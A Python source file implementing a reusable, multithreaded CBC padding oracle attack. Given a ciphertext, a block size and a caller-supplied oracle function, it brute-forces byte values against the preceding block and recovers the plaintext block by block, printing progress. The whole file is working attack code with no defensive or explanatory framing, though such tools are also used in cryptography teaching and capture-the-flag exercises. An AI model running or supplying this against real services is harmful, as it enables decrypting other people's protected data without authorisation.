import threading
import types, typing
import urllib.parse, base64

from concurrent.futures import ThreadPoolExecutor


def base64_decode(s):
    return base64.b64decode(s.encode())

def base64_encode(b):
    return base64.b64encode(b).decode()

def urlencode(b):
    return urllib.parse.quote(b)

def urldecode(b):
    return urllib.parse.unquote_plus(b)


def padding_oracle(cipher, block_size, oracle_threads=1, verbose=True):
    def _execute(oracle):
        
        assert oracle is not None, \
            'the oracle function is not implemented'
        assert callable(oracle), \
            'the oracle function should be callable'
        assert oracle.__code__.co_argcount == 1, \
            'expect oracle function with only 1 argument'
        assert len(cipher) % block_size == 0, \
            'cipher length should be multiple of block size'
            
        lock = threading.Lock()
        oracle_executor = ThreadPoolExecutor(max_workers=oracle_threads)
        plaintext = [b' '] * (len(cipher) - block_size)

        def _update_plaintext(i: int, c: bytes):
            lock.acquire()
            plaintext[i] = c
            if verbose:
                print('[decrypted]', b''.join(plaintext))
            lock.release()
        
        def _block_decrypt_task(i, prev_block: bytes, block: bytes):
            # if verbose:
            #     print('block[{}]: {}'.format(i, block))

            guess_list = list(prev_block)
            
            for j in range(1, block_size + 1):
                oracle_hits = []
                oracle_futures = {}
                
                for k in range(256):
                    # ensure the last padding byte is changed (or it will)
                    if i == len(blocks) - 1 and j == 1 and k == prev_block[-j]:
                        continue
                    
                    test_list = guess_list.copy()
                    test_list[-j] = k
                    oracle_futures[k] = oracle_executor.submit(
                        oracle, bytes(test_list) + block)
                    
                    # if verbose:
                    #     print('+', end='', flush=True)
                
                for k, future in oracle_futures.items():
                    if future.result():
                        oracle_hits.append(k)
                if verbose:
                    print('=> hits(block={}, pos=-{}):'.format(i, j), oracle_hits)
                    
                if len(oracle_hits) != 1:
                    if verbose:
                        print('[!] number of hits is not 1. (skipping this block)')
                    return
                
                guess_list[-j] = oracle_hits[0]
                
                p = guess_list[-j] ^ j ^ prev_block[-j]
                _update_plaintext(i * block_size - j, bytes([p]))
                
                for n in range(j):
                    guess_list[-n-1] ^= j
                    guess_list[-n-1] ^= j + 1
        
        blocks = []
        
        for i in range(0, len(cipher), block_size):
            j = i + block_size
            blocks.append(cipher[i:j])
        
        if verbose:
            print('blocks: {}'.format(blocks))
        
        with ThreadPoolExecutor() as executor:
            futures = []
            for i in reversed(range(1, len(blocks))):
                prev_block = b''.join(blocks[:i])
                block = b''.join(blocks[i:i+1])
                futures.append(
                    executor.submit(
                        _block_decrypt_task, i, prev_block, block))
            for future in futures:
                future.result()
        
        oracle_executor.shutdown()
        
        return b''.join(plaintext)
        
    return _execute
